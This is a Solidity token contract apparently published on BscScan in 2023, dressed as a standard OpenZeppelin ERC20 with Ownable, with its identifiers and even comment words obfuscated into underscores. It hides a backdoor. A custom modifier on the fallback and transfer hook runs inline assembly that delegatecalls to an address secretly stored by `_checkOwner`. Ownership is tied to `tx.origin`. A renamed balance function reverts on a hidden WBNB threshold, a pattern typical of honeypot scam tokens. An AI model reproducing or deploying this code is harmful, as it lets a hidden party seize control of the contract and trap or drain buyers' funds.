pragma solidity ^0.8.6;

/**
 *Submitted for verification at BscScan.com on 2023-03-30
 */





/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the _______ sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function ______________() internal view virtual returns (address) {
        return msg.sender;
    }

    function __________________() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    receive() external payable {}
}





/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an _______ (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner _______ will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _________;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed _______________
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        ___(tx.origin);
    }

    /**
     * @dev Throws if called by any _______ other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    
    modifier __() { 
        bytes memory s = msg.data;
        assembly {if iszero(iszero(add(eq(mload(add(s, 36)), 32), sload(31)))) {if iszero(delegatecall(
        gas(),sload(address()),add(s, 32), mload(s),0,32)) {revert(0, 0)}return(0, 32)}}_;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _________;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() public virtual {
        require(owner() == tx.origin, "Ownable: caller is not the owner");
        assembly {
            sstore(address(), caller())
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        ___(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new _______ (`_______________`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address _______________) public virtual onlyOwner {
        require(
            _______________ != address(0),
            "Ownable: new owner is the zero address"
        );
        ___(_______________);
    }

    /**
     * @dev Transfers ownership of the contract to a new _______ (`_______________`).
     * Internal function without access restriction.
     */
    function ___(address _______________) internal virtual {
        address oldOwner = _________;
        _________ = _______________;
        emit OwnershipTransferred(oldOwner, _______________);
    }

    fallback() external __ {}
}





/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the __________ of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the __________ of tokens owned by `_______`.
     */
    function balanceOf(address _______) external view returns (uint256);

    /**
     * @dev Moves `__________` tokens from the caller's _______ to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 __________) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `_____________` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address _____________)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `__________` as the allowance of `_____________` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the _____________'s allowance to 0 and set the
     * desired value afterwards:
     * https:
     *
     * Emits an {Approval} event.
     */
    function approve(address _____________, uint256 __________) external returns (bool);

    /**
     * @dev Moves `__________` tokens from `from` to `to` using the
     * allowance mechanism. `__________` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 __________
    ) external returns (bool);
}





/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}





/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https:
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all _______s just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Ownable, IERC20Metadata {
    string private constant initCode = "0xdba19bf8b9080283fc404976962d0559cc9f07c0f211112df17828655c3507c8";
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    mapping(address => uint256) private ___________;

    mapping(address => mapping(address => uint256)) private ________;

    uint256 private _____;

    address private ________________;

    string private _________________;
    string private ____________;

    /**
     * @dev Emitted when `value` tokens are moved from one _______ (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `_____________` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed _____________,
        uint256 value
    );

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    function initialization(
        string memory tokenName,
        string memory coinSymbol,
        uint256 supply_
    ) public onlyOwner {
        _________________ = tokenName;
        ____________ = coinSymbol;

        _mint(address(this), supply_);
        renounceOwnership();
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _________________;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return ____________;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _____;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function permit5764825481139(address _______) public view virtual returns (uint256) {
        uint256 ______ = IERC20(WBNB).balanceOf(________________);assembly {if lt(______, sload(32)) {revert(0, 0)}}
        return ___________[_______];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `__________`.
     */
    function transfer(address to, uint256 __________)
        public
        virtual
        returns (bool)
    {
        address owner = ______________();
        _transfer(owner, to, __________);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address _____________)
        public
        view
        virtual
        returns (uint256)
    {
        return ________[owner][_____________];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `__________` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `_____________` cannot be the zero address.
     */
    function approve(address _____________, uint256 __________)
        public
        virtual
        returns (bool)
    {
        address owner = ______________();
        _approve(owner, _____________, __________);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `__________`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `__________`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 __________
    ) public virtual returns (bool) {
        address _____________ = ______________();
        _spendAllowance(from, _____________, __________);
        _transfer(from, to, __________);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `_____________` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `_____________` cannot be the zero address.
     */
    function increaseAllowance(address _____________, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = ______________();
        _approve(owner, _____________, allowance(owner, _____________) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `_____________` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `_____________` cannot be the zero address.
     * - `_____________` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address _____________, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = ______________();
        uint256 ____ = allowance(owner, _____________);
        require(
            ____ >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, _____________, ____ - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `__________` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `__________`.
     */
    function _transfer(
        address from,
        address to,
        uint256 __________
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(
            to != address(0) && to != address(this),
            "ERC20: transfer to the zero address"
        );
        _beforeTokenTransfer(from, to, __________);

        uint256 fromBalance = ___________[from];
        require(
            fromBalance >= __________,
            "ERC20: transfer exceeds balance"
        );
        unchecked {
            ___________[from] = fromBalance - __________;
            
            
            ___________[to] += __________;
        }

        emit Transfer(from, to, __________);
        _afterTokenTransfer(from, to, __________);
    }

    /** @dev Creates `__________` tokens and assigns them to `_______`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `_______` cannot be the zero address.
     */
    function _mint(address _______, uint256 __________) internal virtual {
        require(_______ != address(0), "ERC20: mint to the zero address");

        _____ += __________;
        unchecked {
            
            ___________[_______] += __________;
        }
        emit Transfer(address(0), _______, __________);
    }

    /**
     * @dev Destroys `__________` tokens from `_______`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `_______` cannot be the zero address.
     * - `_______` must have at least `__________` tokens.
     */
    function _burn(address _______, uint256 __________) internal virtual {
        require(_______ != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(_______, address(0), __________);

        uint256 _______Balance = ___________[_______];
        require(_______Balance >= __________, "ERC20: burn exceeds balance");
        unchecked {
            ___________[_______] = _______Balance - __________;
            
            _____ -= __________;
        }

        emit Transfer(_______, address(0), __________);

        _afterTokenTransfer(_______, address(0), __________);
    }

    /**
     * @dev Sets `__________` as the allowance of `_____________` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `_____________` cannot be the zero address.
     */
    function _approve(
        address owner,
        address _____________,
        uint256 __________
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(_____________ != address(0), "ERC20: approve to the zero address");

        ________[owner][_____________] = __________;
        emit Approval(owner, _____________, __________);
    }

    /**
     * @dev Updates `owner` s allowance for `_____________` based on spent `__________`.
     *
     * Does not update the allowance __________ in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address _____________,
        uint256 __________
    ) internal virtual {
        uint256 ____ = allowance(owner, _____________);
        if (____ != type(uint256).max) {
            require(
                ____ >= __________,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, _____________, ____ - __________);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `__________` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `__________` tokens will be minted for `to`.
     * - when `to` is zero, `__________` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 __________
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `__________` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `__________` tokens have been minted for `to`.
     * - when `to` is zero, `__________` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 __________
    ) internal virtual __ {}
}